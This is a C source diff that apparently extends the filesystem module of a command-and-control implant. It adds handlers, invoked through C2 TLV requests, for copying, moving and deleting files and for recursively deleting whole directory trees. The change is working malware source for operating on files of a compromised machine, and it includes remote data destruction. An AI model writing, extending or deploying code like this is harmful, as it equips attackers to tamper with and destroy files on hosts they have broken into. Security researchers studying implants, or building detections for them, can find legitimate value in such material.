@@ -65,14 +65,26 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        FS_BASE, \
                        API_CALL + 4)
-#define FS_DELETE \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       FS_BASE, \
-                       API_CALL + 5)
 #define FS_CHDIR \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        FS_BASE, \
+                       API_CALL + 5)
+#define FS_FILE_DELETE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       FS_BASE, \
                        API_CALL + 6)
+#define FS_FILE_COPY \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       FS_BASE, \
+                       API_CALL + 7)
+#define FS_FILE_MOVE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       FS_BASE, \
+                       API_CALL + 8)
+#define FS_DIR_DELETE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       FS_BASE, \
+                       API_CALL + 9)
 
 #define FS_PIPE_FILE \
         TLV_PIPE_CUSTOM(PIPE_STATIC, \
@@ -90,6 +102,12 @@
 #define htole64(x) OSSwapHostToLittleInt64(x)
 #else
 #include <endian.h>
+#endif
+
+#ifdef IS_WINDOWS
+#ifndef S_ISLNK
+#define	S_ISLNK(mode) (0)
+#endif
 #endif
 
 #ifndef GLOB_TILDE
@@ -110,6 +128,191 @@ struct stat_table
     uint64_t mtime;
     uint64_t ctime;
 } __attribute__((packed));
+
+typedef struct tree
+{
+    void *cb_data;
+    eio_cb cb;
+    eio_req *group_dents;
+    eio_req *group_dir;
+    char path[PATH_MAX];
+} tree_t;
+
+eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data);
+
+static int tree_group_add(eio_req *group, eio_req *request)
+{
+    if (!request)
+    {
+        group->result = -1;
+        return -1;
+    }
+
+    eio_grp_add(group, request);
+    return 0;
+}
+
+static int tree_dir_set(eio_req *request)
+{
+    tree_t *tree;
+
+    tree = request->data;
+
+    if (request->result < 0)
+    {
+        tree->group_dir->result = request->result;
+    }
+
+    return request->result;
+}
+
+static int tree_dents_set(eio_req *request)
+{
+    tree_t *tree;
+
+    tree = request->data;
+
+    if (request->result < 0)
+    {
+        tree->group_dents->result = request->result;
+    }
+
+    return request->result;
+}
+
+static int tree_stat(eio_req *request)
+{
+    tree_t *tree;
+    char *path;
+    EIO_STRUCT_STAT *buffer;
+    eio_req *new_request;
+
+    tree = request->data;
+    path = EIO_PATH(request);
+    buffer = (EIO_STRUCT_STAT *)request->ptr2;
+
+    if (tree_dents_set(request) < 0)
+    {
+        return request->result;
+    }
+
+    if (S_ISDIR(buffer->st_mode))
+    {
+        new_request = eio_rmtree(path, 0, tree_dents_set, tree);
+    }
+    else
+    {
+        new_request = eio_unlink(path, 0, tree_dents_set, tree);
+    }
+
+    return tree_group_add(tree->group_dents, new_request);
+}
+
+static int tree_dir(eio_req *request)
+{
+    tree_t *tree;
+    eio_cb cb;
+
+    tree = request->data;
+    cb = tree->cb;
+    request->data = tree->cb_data;
+
+    free(tree);
+
+    if (!cb)
+    {
+        return request->result;
+    }
+
+    return cb(request);
+}
+
+static int tree_dents(eio_req *request)
+{
+    tree_t *tree;
+
+    tree = request->data;
+
+    if (tree_dir_set(request) < 0)
+    {
+        return request->result;
+    }
+
+    return tree_group_add(tree->group_dir, eio_rmdir(tree->path, 0, tree_dir_set, tree));
+}
+
+static int tree_readdir(eio_req *request)
+{
+    tree_t *tree;
+    int iter;
+    int error;
+    char *path;
+    char *name;
+    char fq_path[PATH_MAX + 1];
+
+    tree = request->data;
+    path = tree->path;
+    name = (char *)request->ptr2;
+
+    if (tree_dents_set(request) < 0)
+    {
+        return request->result;
+    }
+
+    for (iter = 0; iter < request->result; iter++)
+    {
+        snprintf(fq_path, sizeof(fq_path), "%s/%s", path, name);
+        error = tree_group_add(tree->group_dents, eio_lstat(fq_path, 0, tree_stat, tree));
+
+        if (error)
+        {
+            return error;
+        }
+
+        name += strlen(name) + 1;
+    }
+
+    return 0;
+}
+
+eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data)
+{
+    tree_t *tree;
+
+    tree = malloc(sizeof(*tree));
+
+    if (tree == NULL)
+    {
+        return NULL;
+    }
+
+    strncpy(tree->path, path, PATH_MAX);
+
+    tree->cb = cb;
+    tree->cb_data = data;
+
+    tree->group_dents = eio_grp(tree_dents, tree);
+    tree->group_dir = eio_grp(tree_dir, tree);
+
+    if (!tree->group_dents && !tree->group_dir)
+    {
+        free(tree);
+        return NULL;
+    }
+
+    if (path == NULL)
+    {
+        tree->group_dents->result = -1;
+        tree->group_dir->result = -1;
+    }
+    else
+    {
+        tree_group_add(tree->group_dents, eio_readdir(path, EIO_READDIR_STAT_ORDER, pri, tree_readdir, tree));
+        eio_grp_add(tree->group_dir, tree->group_dents);
+    }
+
+    return tree->group_dir;
+}
 
 static void fs_add_stat(tlv_pkt_t **tlv_pkt, EIO_STRUCT_STAT *stat)
 {
@@ -132,6 +335,24 @@ static void fs_add_stat(tlv_pkt_t **tlv_pkt, EIO_STRUCT_STAT *stat)
 #endif
 
     tlv_pkt_add_raw(*tlv_pkt, TLV_TYPE_BYTES, &stat_buffer, sizeof(stat_buffer));
+}
+
+static int fs_eio(eio_req *request)
+{
+    int status;
+    c2_t *c2;
+
+    c2 = request->data;
+
+    status = request->result < 0 ? API_CALL_FAIL : API_CALL_SUCCESS;
+    c2->response = api_craft_tlv_pkt(status);
+
+    c2_enqueue_tlv(c2, c2->response);
+
+    tlv_pkt_destroy(c2->request);
+    tlv_pkt_destroy(c2->response);
+
+    return 0;
 }
 
 static int fs_eio_stat(eio_req *request)
@@ -268,22 +489,95 @@ static int fs_eio_list(eio_req *request)
     return 0;
 }
 
-static int fs_eio(eio_req *request)
+static int fs_eio_dir_delete(eio_req *request)
 {
-    int status;
     c2_t *c2;
+    char *path;
+    EIO_STRUCT_STAT *buffer;
+    eio_req *new_request;
 
     c2 = request->data;
+    path = EIO_PATH(request);
+    buffer = (EIO_STRUCT_STAT *)request->ptr2;
+    new_request = NULL;
 
-    status = request->result < 0 ? API_CALL_FAIL : API_CALL_SUCCESS;
+    if (request->result < 0)
+    {
+        return fs_eio(request);
+    }
+
+    if (S_ISLNK(buffer->st_mode))
+    {
+        new_request = eio_unlink(path, 0, fs_eio, c2);
+    }
+    else if (S_ISDIR(buffer->st_mode))
+    {
+        new_request = eio_rmtree(path, 0, fs_eio, c2);
+    }
+
+    if (!new_request)
+    {
+        request->result = -1;
+        fs_eio(request);
+    }
+
+    return request->result;
+}
+
+static void fs_eio_file_copy(struct eio_req *request)
+{
+    c2_t *c2;
+    FILE *source;
+    FILE *dest;
+
+    int status;
+    char src[PATH_MAX];
+    char dst[PATH_MAX];
+    char buffer[4096];
+    size_t bytes;
+
+    c2 = request->data;
+    status = API_CALL_SUCCESS;
+
+    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, src);
+    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, dst);
+
+    source = fopen(src, "rb");
+
+    if (source == NULL)
+    {
+        status = API_CALL_FAIL;
+        goto fail;
+    }
+
+    dest = fopen(dst, "wb");
+
+    if (dest == NULL)
+    {
+        status = API_CALL_FAIL;
+        goto fail;
+    }
+
+    while ((bytes = fread(buffer, sizeof(char), sizeof(buffer), source)) > 0)
+    {
+        if (fwrite(buffer, sizeof(char), bytes, dest) != bytes)
+        {
+            fclose(source);
+            fclose(dest);
+            status = API_CALL_FAIL;
+            goto fail;
+        }
+    }
+
+    fclose(source);
+    fclose(dest);
+
+fail:
     c2->response = api_craft_tlv_pkt(status);
-
     c2_enqueue_tlv(c2, c2->response);
 
     tlv_pkt_destroy(c2->request);
     tlv_pkt_destroy(c2->response);
-
-    return 0;
 }
 
 static tlv_pkt_t *fs_list(c2_t *c2)
@@ -354,7 +648,7 @@ static tlv_pkt_t *fs_chmod(c2_t *c2)
     return NULL;
 }
 
-static tlv_pkt_t *fs_delete(c2_t *c2)
+static tlv_pkt_t *fs_file_delete(c2_t *c2)
 {
     char path[PATH_MAX];
 
@@ -376,6 +670,34 @@ static tlv_pkt_t *fs_chdir(c2_t *c2)
     }
 
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
+}
+
+static tlv_pkt_t *fs_file_copy(c2_t *c2)
+{
+    eio_custom(fs_eio_file_copy, 0, NULL, c2);
+    return NULL;
+}
+
+static tlv_pkt_t *fs_file_move(c2_t *c2)
+{
+    char src[PATH_MAX];
+    char dst[PATH_MAX];
+
+    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, src);
+    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, dst);
+
+    eio_rename(src, dst, 0, fs_eio, c2);
+    return NULL;
+}
+
+static tlv_pkt_t *fs_dir_delete(c2_t *c2)
+{
+    char path[PATH_MAX];
+
+    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
+
+    eio_lstat(path, 0, fs_eio_dir_delete, c2);
+    return NULL;
 }
 
 static int fs_file_create(pipe_t *pipe, c2_t *c2)
@@ -446,8 +768,11 @@ void register_fs_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, FS_GETWD, fs_getwd);
     api_call_register(api_calls, FS_MKDIR, fs_mkdir);
     api_call_register(api_calls, FS_CHMOD, fs_chmod);
-    api_call_register(api_calls, FS_DELETE, fs_delete);
     api_call_register(api_calls, FS_CHDIR, fs_chdir);
+    api_call_register(api_calls, FS_FILE_DELETE, fs_file_delete);
+    api_call_register(api_calls, FS_FILE_COPY, fs_file_copy);
+    api_call_register(api_calls, FS_FILE_MOVE, fs_file_move);
+    api_call_register(api_calls, FS_DIR_DELETE, fs_dir_delete);
 }
 
 void register_fs_api_pipes(pipes_t **pipes)
